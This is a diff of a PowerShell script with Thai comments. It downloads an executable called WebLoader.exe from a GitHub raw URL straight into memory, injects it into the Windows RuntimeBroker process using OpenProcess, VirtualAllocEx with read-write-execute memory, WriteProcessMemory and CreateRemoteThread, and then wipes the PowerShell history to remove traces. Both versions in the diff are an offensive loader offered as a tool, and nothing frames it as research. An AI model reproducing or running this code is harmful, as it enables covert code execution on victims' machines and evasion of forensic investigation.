@@ -1,48 +1,48 @@
-# --- 1. ตั้งค่า URL ของไฟล์ C++ EXE ---
+# --- 1. เตรียมส่วนประกอบและดาวน์โหลด ---
 $url = "https://raw.githubusercontent.com/VortexStore/headhunter/refs/heads/main/WebLoader.exe"
+$targetName = "RuntimeBroker"
 
-# --- 2. ฟังก์ชันสำหรับเรียกใช้ Win32 API (เพื่อให้รองรับ Native Code) ---
-$Kernel32 = Add-Type -MemberDefinition @"
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    [DllImport("kernel32.dll")]
-    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-"@ -Name "Win32" -Namespace Win32Functions -PassThru
+# นิยาม Win32 API เพื่อใช้จัดการ Memory ระดับลึก
+$Win32Definitions = @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
+    [DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+}
+"@
+Add-Type -TypeDefinition $Win32Definitions
 
 try {
     Write-Host "[*] Downloading C++ Payload to RAM..." -ForegroundColor Cyan
-    $bin = (New-Object System.Net.WebClient).DownloadData($url)
+    $exeBytes = (New-Object System.Net.WebClient).DownloadData($url)
 
-    # 3. ค้นหา RuntimeBroker
-    $target = Get-Process -Name "RuntimeBroker" -ErrorAction SilentlyContinue | Select-Object -First 1
-    if ($null -eq $target) { throw "Target process not found." }
+    # 2. ค้นหา Process เป้าหมาย
+    $proc = Get-Process -Name $targetName -ErrorAction SilentlyContinue | Select-Object -First 1
+    if ($null -eq $proc) { throw "Target $targetName not found." }
 
-    $hProcess = [Win32Functions.Win32]::OpenProcess(0x1F0FFF, $false, $target.Id)
-    
-    # 4. จองพื้นที่และเขียน Code ลงใน RAM ของ RuntimeBroker
-    Write-Host "[*] Allocating memory in PID: $($target.Id)" -ForegroundColor Yellow
-    $addr = [Win32Functions.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint]$bin.Length, 0x3000, 0x40) # PAGE_EXECUTE_READWRITE
-    
+    # 3. เปิด Process และจองพื้นที่ใน RAM (RWX - Read, Write, Execute)
+    $hProc = [Win32]::OpenProcess(0x1F0FFF, $false, $proc.Id)
+    $remoteMem = [Win32]::VirtualAllocEx($hProc, [IntPtr]::Zero, [uint]$exeBytes.Length, 0x3000, 0x40)
+
+    # 4. เขียนไฟล์ EXE ลงไปใน RAM ของ RuntimeBroker
     $written = 0
-    [Win32Functions.Win32]::WriteProcessMemory($hProcess, $addr, $bin, [uint]$bin.Length, [ref]$written)
+    [Win32]::WriteProcessMemory($hProc, $remoteMem, $exeBytes, [uint]$exeBytes.Length, [ref]$written)
 
-    # 5. สั่งให้ Code ทำงาน
-    Write-Host "[*] Executing thread..." -ForegroundColor Green
-    [Win32Functions.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+    # 5. สั่งรัน Thread ใหม่จากตำแหน่งที่เขียนลงไป
+    Write-Host "[*] Successfully injected into $($targetName) (PID: $($proc.Id))" -ForegroundColor Green
+    [Win32]::CreateRemoteThread($hProc, [IntPtr]::Zero, 0, $remoteMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
 
 } catch {
     Write-Host "[!] Error: $_" -ForegroundColor Red
 } finally {
-    # --- 6. ลบประวัติร่องรอยทั้งหมด ---
-    Write-Host "[*] Cleaning up history..." -ForegroundColor Magenta
-    $hPath = (Get-PSReadlineOption).HistorySavePath
-    if (Test-Path $hPath) { Clear-Content $hPath }
+    # --- 6. ทำลายหลักฐานและลบประวัติ ---
+    Write-Host "[*] Cleaning up traces..." -ForegroundColor Magenta
+    $history = (Get-PSReadlineOption).HistorySavePath
+    if (Test-Path $history) { Clear-Content $history }
     Clear-History
-    Write-Host "[+] Complete. Exiting..."
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 1
     exit
 }
